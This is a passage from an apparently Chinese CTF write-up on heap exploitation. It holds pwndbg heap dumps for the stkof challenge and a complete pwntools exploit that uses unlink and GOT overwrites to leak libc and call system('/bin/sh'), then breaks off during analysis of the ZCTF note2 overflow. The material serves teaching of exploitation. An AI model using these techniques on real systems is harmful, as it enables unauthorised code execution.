globals[idx];</span><br></pre></td></tr></table></figure><h3 id="IO-缓冲区问题分析"><a href="#IO-缓冲区问题分析" class="headerlink" title="IO 缓冲区问题分析"></a>IO 缓冲区问题分析</h3><p>这条题目堆空间一开始可能和我们想象的不一样，这是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看。</p><p>初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd860 ◂— 0x16</span><br><span class="line">*R8   0x1</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0xa</span><br><span class="line">*R13  0x9</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;        push   rbp &lt;0x7ffff7dd18e0&gt;</span><br><span class="line">...，省略</span><br><span class="line"> ► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a8769c _IO_file_underflow+508</span><br><span class="line">   f 4     7ffff7a8860e _IO_default_uflow+14</span><br><span class="line">   f 5     7ffff7a7bc6a _IO_getline_info+170</span><br><span class="line">   f 6     7ffff7a7bd78</span><br><span class="line">   f 7     7ffff7a7ab7d fgets+173</span><br><span class="line">   f 8           400d2e</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure><p>分配之后，堆如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05410</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134129,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当分配16大小的内存后，堆布局如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05430</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x20bd1</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134097,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当使用 printf 函数，会分配 1024 字节空间，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd1c0 ◂— 0x16</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x1</span><br><span class="line">*R13  0x7fffffffd827 ◂— 0x31 &#x2F;* &#39;1&#39; *&#x2F;</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x400de4 ◂— and    eax, 0x2e000a64 &#x2F;* &#39;%d\n&#39; *&#x2F;</span><br><span class="line">*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284</span><br><span class="line">*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;       push   rbp &lt;0x7ffff7dd2620&gt;</span><br><span class="line">。。。省略</span><br><span class="line">► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a878f8 _IO_file_overflow+456</span><br><span class="line">   f 4     7ffff7a8628d _IO_file_xsputn+173</span><br><span class="line">   f 5     7ffff7a5ae00 vfprintf+3216</span><br><span class="line">   f 6     7ffff7a62899 printf+153</span><br><span class="line">   f 7           4009cd</span><br><span class="line">   f 8           400cb1</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure><p>堆布局如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05840</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa4b4f,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05840 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 133057,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。</p><p>但是，比较有意思的是，如果我们是 gdb.attach 上去的话，第一个缓冲区分配的大小为 4096 大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x1e9b010</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x1e9a000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 4113,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x1e9b010 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 135153,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请第一个堆（0x48），之后还会出现第二个缓冲区堆块（1040）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;重新启动过，所以地址与上面不对应，但是结构是一样的</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 4113, </span><br><span class="line">  fd &#x3D; 0xa383231, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe06010 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe06060 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 1041, </span><br><span class="line">  fd &#x3D; 0xa4b4f, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">…………</span><br></pre></td></tr></table></figure><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p><p>由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下：</p><ul><li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。</li><li>利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 &amp;global[2]-0x18 。</li><li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。</li><li>free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。</li><li>修改 global[1] 为 /bin/sh 地址，修改 <code>free@got</code> 为 <code>system@got</code> 的地址，free chunk 1 即可。</li></ul><p>unlink 我们搞两个物理相邻的堆即可（2&amp;3），也不需要关心 chunk3  free 时会与 topchunk 合并，所以没有创建一个保护堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x48</span>)<span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x30</span>)<span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment"># 3</span></span><br></pre></td></tr></table></figure><blockquote><p>最后 getshell 做法和 wiki 略有区别。</p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="built_in">globals</span> = <span class="number">0x0602140</span></span><br><span class="line">ptr = <span class="built_in">globals</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x48</span>)<span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x30</span>)<span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造一个堆块；修改chunk3 size；</span></span><br><span class="line">payload0 = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload0 += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload0 += p64(<span class="number">0x20</span>)</span><br><span class="line">payload0 = payload0.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload0 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload0),payload0)</span><br><span class="line"><span class="comment"># 触发unlink</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改global指针表</span></span><br><span class="line">payload1 = <span class="string">&quot;skye&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1 += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment"># 0</span></span><br><span class="line">payload1 += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])<span class="comment"># 1</span></span><br><span class="line">payload1 += p64(<span class="built_in">globals</span>-<span class="number">0x8</span>)<span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free 2 puts</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&#x27;binsh_addr:&#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr:&#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改global指针表</span></span><br><span class="line">payload2 = <span class="string">&quot;skye&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment"># 0</span></span><br><span class="line">payload2 += p64(binsh_addr)<span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"><span class="comment"># overwrite free 2 system</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x0400919&#x27;)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked</span><br></pre></td></tr></table></figure><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先，我们先分析一下程序，可以看出程序的主要功能为</p><ul><li>添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。</li><li>展示 note 内容。</li><li>编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。</li><li>释放 note。</li></ul><p>仔细分析后，可以发现程序有以下几个问题</p><ol><li><p>在 create 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容。自定义函数中的循环变量 i 定义为 int 型，但是用于比较的传入参数定义是 unsigned int 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; length - <span class="number">1</span> &gt; i; ++i )          <span class="comment">// 预留最后一位写入\x00</span></span><br><span class="line">    <span class="comment">// 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);                                 <span class="comment">// 读入错误退出程序</span></span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )                            <span class="comment">// 判断结束符</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + ptr) = buf;</span><br><span class="line">&#125;</span><br><span class="line">*(_BYTE *)(ptr + i) = <span class="number">0</span>;                      <span class="comment">// 写入结束符\x00</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br></pre></td></tr></table></figure><p>在 C 语言中，我们用 int 和 unsigned int 两种数据类型进行运算时，会自动转换为 unsigned int，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，即：prez_size,size,fd,bk。因为 size 为 0 ，然后退出判断条件为：size-1 ，那么退出条件就恒满足，程序读取的长度就不受到限制，故而会产生堆溢出。</p></li><li><p>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL，对做题没有影响。但是注意一下每次编辑时可输入的长度，是否能被利用。（后面有详解）</p></li></ol><h3 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>在编辑 create 时调用，存在写入长度可控，造成堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; length - <span class="number">1</span> &gt; i; ++i )          <span class="comment">// 预留最后一位写入\x00</span></span><br><span class="line">    <span class="comment">// 堆溢出：length为unsigned 